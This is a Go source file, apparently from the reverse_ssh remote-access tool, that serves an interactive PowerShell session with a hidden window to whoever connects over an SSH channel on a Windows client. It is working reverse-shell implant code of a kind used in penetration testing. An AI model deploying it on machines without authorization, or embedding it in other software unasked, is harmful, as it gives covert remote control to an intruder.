// +build windows
package client

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/ActiveState/termtest/conpty"
	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/terminal"
	"github.com/NHAS/reverse_ssh/internal/server/users"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows"
)

//The basic windows shell handler, as there arent any good golang libraries to work with windows conpty
func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger) {

	// At this point, we have the opportunity to reject the client's.
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		log.Error("Could not accept channel (%s)", err)
		return
	}
	defer connection.Close()

	for req := range requests {
		log.Info("Got request: %s", req.Type)
		switch req.Type {

		case "shell":
			// We only accept the default shell
			// (i.e. no command in the Payload)
			req.Reply(len(req.Payload) == 0, nil)

		case "pty-req":
			req.Reply(true, nil)

			vsn := windows.RtlGetVersion()
			if vsn.MajorVersion < 10 || vsn.BuildNumber < 17763 {
				log.Info("Windows version too old for Conpty, using basic shell")
				basicShell(log, connection)
			} else {
				ptyreq, _ := internal.ParsePtyReq(req.Payload)
				conptyShell(requests, log, ptyreq, connection)
			}

			connection.Close()

		default:
			req.Reply(false, nil)
		}
	}

}

func conptyShell(reqs <-chan *ssh.Request, log logger.Logger, ptyReq internal.PtyReq, connection ssh.Channel) {

	cpty, err := conpty.New(int16(ptyReq.Width), int16(ptyReq.Height))
	if err != nil {
		log.Fatal("Could not open a conpty terminal: %v", err)
	}
	defer cpty.Close()

	// Dynamically handle resizes of terminal window
	go func() {
		for req := range reqs {
			switch req.Type {

			case "window-change":
				w, h := internal.ParseDims(req.Payload)
				cpty.Resize(uint16(w), uint16(h))
			}

		}
	}()

	// Spawn and catch new powershell process
	pid, _, err := cpty.Spawn(
		"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		[]string{},
		&syscall.ProcAttr{
			Env: os.Environ(),
		},
	)
	if err != nil {
		log.Fatal("Could not spawn a powershell: %v", err)
	}
	log.Info("New process with pid %d spawned", pid)
	process, err := os.FindProcess(pid)
	if err != nil {
		log.Fatal("Failed to find process: %v", err)
	}

	// Link data streams of ssh session and conpty
	go io.Copy(connection, cpty.OutPipe())
	go io.Copy(cpty.InPipe(), connection)

	ps, err := process.Wait()
	if err != nil {
		log.Error("Error waiting for process: %v", err)
		return
	}
	log.Info("Session ended normally, exit code %d", ps.ExitCode())

}

func basicShell(log logger.Logger, connection ssh.Channel) {

	c := make(chan os.Signal, 1)
	expected := make(chan bool, 1)

	signal.Notify(c, os.Interrupt)
	signal.Notify(c, syscall.SIGTERM)

	go func() {
		for {
			select {
			case <-c:
				os.Exit(0)
			case <-expected:
				<-c

			}
		}
	}()

	cmd := exec.Command("powershell.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.STARTF_USESTDHANDLES,
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Error("%s", err)
		return
	}

	cmd.Stderr = cmd.Stdout

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Error("%s", err)
		return
	}

	term := terminal.NewTerminal(connection, "")

	go func() {

		buf := make([]byte, 128)

		for {

			n, err := stdout.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Error("%s", err)
				}
				return
			}

			_, err = term.Write(buf[:n])
			if err != nil {
				log.Error("%s", err)
				return
			}

		}
	}()

	go func() {

		for {
			//This will break if the user does CTRL+D apparently we need to reset the whole terminal if a user does this.... so just exit instead
			line, err := term.ReadLine()
			if err != nil && err != terminal.ErrCtrlC {
				log.Error("%s", err)
				return
			}

			if err == terminal.ErrCtrlC {
				expected <- true
				err := sendCtrlC(cmd.Process.Pid)
				if err != nil {
					fmt.Fprintf(term, "Failed to send Ctrl +C sorry! You are most likely trapped: %s", err)
					log.Error("%s", err)
				}
			}

			if err == nil {
				stdin.Write([]byte(line + "\r\n"))
			}

		}

	}()

	err = cmd.Run()
	if err != nil {
		log.Error("%s", err)
	}
}

func sendCtrlC(pid int) error {

	d, e := syscall.LoadDLL("kernel32.dll")

	if e != nil {

		return fmt.Errorf("LoadDLL: %v\n", e)

	}

	p, e := d.FindProc("GenerateConsoleCtrlEvent")

	if e != nil {

		return fmt.Errorf("FindProc: %v\n", e)

	}
	r, _, e := p.Call(syscall.CTRL_C_EVENT, uintptr(pid))

	if r == 0 {

		return fmt.Errorf("GenerateConsoleCtrlEvent: %v\n", e)

	}

	return nil

}
